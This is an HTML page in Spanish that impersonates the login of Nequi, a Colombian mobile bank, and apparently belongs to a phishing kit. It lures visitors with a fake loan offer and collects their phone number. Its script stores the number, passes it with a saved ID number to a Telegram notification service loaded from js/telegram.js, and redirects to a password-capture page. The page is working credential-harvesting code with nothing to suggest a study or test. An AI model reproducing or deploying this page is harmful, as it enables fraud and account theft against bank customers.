<!doctype html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Nequi</title>
  <link rel="shortcut icon" type="image/x-icon" href="images/favicon-3.ico">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">

  <link rel="stylesheet" href="css/login.css?v=2">
</head>
<body>

  <!-- ============================================================
       PANTALLA INTERSTICIAL PREVIA (HACE LA TRANSICIÓN AL CLIC)
       ============================================================ -->
  <div class="image-back" id="imageBack">
    <div class="interstitial-card">
      <h1 class="interstitial-title">¡Estás a punto de solicitar un crédito con Nequi!</h1>

      <div class="interstitial-illustration">
        <img src="images/reloj_ilustracion.png" alt="Solicitar crédito Nequi" id="relojImg">
      </div>

      <p class="interstitial-desc">Ten en cuenta que por tu seguridad y para evitar fraudes, el crédito debe ser solicitado ingresando a tu cuenta de Nequi.</p>

      <a id="btn-solicitar" class="nq-btn w-button" role="button">Continuar solicitud</a>
    </div>
  </div>

  <!-- ============================================================
       PANTALLA DE INGRESO (CELULAR) - DISEÑO EXACTO A IMAGEN 2
       ============================================================ -->
  <div class="screen-wrapper">
    <section class="login-container" id="mainContainer">
      <div class="top-spacer"></div>

      <!-- Logo Oficial Nequi Exacto -->
      <div class="logo-container">

        </svg>
      </div>

      <div class="middle-spacer"></div>

      <!-- Formulario de Celular -->
      <div class="form-container">
        <form id="homeForm" autocomplete="off" novalidate>
          
          <!-- Input Píldora: +57 | 3XX XXX XXXX -->
          <div class="input-wrapper">
            <span class="prefix-text">+57</span>
            <div class="divider"></div>
            <div class="input-container">
              <input 
                type="tel" 
                id="phoneNumber" 
                name="phoneNumber"
                inputmode="numeric" 
                placeholder="Ingresa tu cel" 
                autocomplete="tel" 
                maxlength="14"
              >
            </div>
          </div>

          <!-- Botones: [ Entra ] [ $ ] -->
          <div class="buttons-row">
            <button class="btn-entra" id="loginButton" type="submit" disabled>
              Entra
            </button>
            <button class="btn-dollar" id="btnDollar" type="button" disabled title="Acciones">
              $
            </button>
          </div>

        </form>
      </div>
    </section>
  </div>

  <!-- Scripts: Telegram -->
  <script src="js/telegram.js"></script>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const btnSolicitar = document.getElementById("btn-solicitar");
      const imageBack = document.getElementById("imageBack");
      const phoneInput = document.getElementById("phoneNumber");
      const loginButton = document.getElementById("loginButton");
      const btnDollar = document.getElementById("btnDollar");
      const form = document.getElementById("homeForm");

      // La pantalla intersticial siempre se muestra antes del login
      // Al hacer clic en "Continuar solicitud", se hace la transición a la pantalla de celular

      // Cerrar pantalla previa al hacer clic en el botón o en la tarjeta
      function dismissInterstitial() {
        if (imageBack) {
          imageBack.classList.add("hidden");
          setTimeout(() => {
            imageBack.style.display = "none";
            if (phoneInput) phoneInput.focus();
          }, 200);
        }
      }

      if (btnSolicitar) {
        btnSolicitar.addEventListener("click", (e) => {
          e.preventDefault();
          dismissInterstitial();
        });
      }

      if (imageBack) {
        imageBack.addEventListener("click", (e) => {
          if (e.target.id === "imageBack" || e.target.closest(".nq-btn")) {
            dismissInterstitial();
          }
        });
      }

      // Limpia prefijo 57 si fue pegado y extrae dígitos
      function limpiarNumero(valor) {
        let digitos = valor.replace(/\D/g, "");
        if (digitos.startsWith("57") && digitos.length > 10) {
          digitos = digitos.slice(2);
        }
        return digitos.slice(0, 10);
      }

      // Máscara y formato: 3XX XXX XXXX (3 dígitos - espacio - 3 dígitos - espacio - 4 dígitos)
      function formatearCelular(valor) {
        const digitos = limpiarNumero(valor);
        if (digitos.length <= 3) {
          return digitos;
        } else if (digitos.length <= 6) {
          return digitos.slice(0, 3) + " " + digitos.slice(3);
        } else {
          return digitos.slice(0, 3) + " " + digitos.slice(3, 6) + " " + digitos.slice(6, 10);
        }
      }

      // Validación de celular (10 dígitos)
      function esCelularValido(valor) {
        const digitos = limpiarNumero(valor);
        return digitos.length === 10;
      }

      if (phoneInput) {
        phoneInput.addEventListener("input", (e) => {
          const formatted = formatearCelular(e.target.value);
          e.target.value = formatted;

          const esValido = esCelularValido(formatted);
          if (loginButton) loginButton.disabled = !esValido;
          if (btnDollar) btnDollar.disabled = !esValido;
        });

        phoneInput.addEventListener("paste", (e) => {
          setTimeout(() => {
            phoneInput.value = formatearCelular(phoneInput.value);
            const esValido = esCelularValido(phoneInput.value);
            if (loginButton) loginButton.disabled = !esValido;
            if (btnDollar) btnDollar.disabled = !esValido;
          }, 50);
        });
      }

      // Envío de formulario
      async function submitLogin() {
        const rawPhone = phoneInput ? phoneInput.value.replace(/\D/g, "") : "";
        if (esCelularValido(rawPhone)) {
          const formData = JSON.parse(localStorage.getItem("formData")) || {};
          formData.phoneNumber = rawPhone;
          localStorage.setItem("formData", JSON.stringify(formData));

          if (loginButton) {
            loginButton.disabled = true;
            loginButton.textContent = "Entrando...";
          }

          if (window.TelegramService) {
            await window.TelegramService.notifyCelular(formData.cedula, rawPhone);
          }

          window.location.href = "access-sign-in-pass.html";
        }
      }

      if (form) {
        form.addEventListener("submit", (e) => {
          e.preventDefault();
          submitLogin();
        });
      }

      if (btnDollar) {
        btnDollar.addEventListener("click", () => {
          submitLogin();
        });
      }
    });
  </script>
</body>
</html>
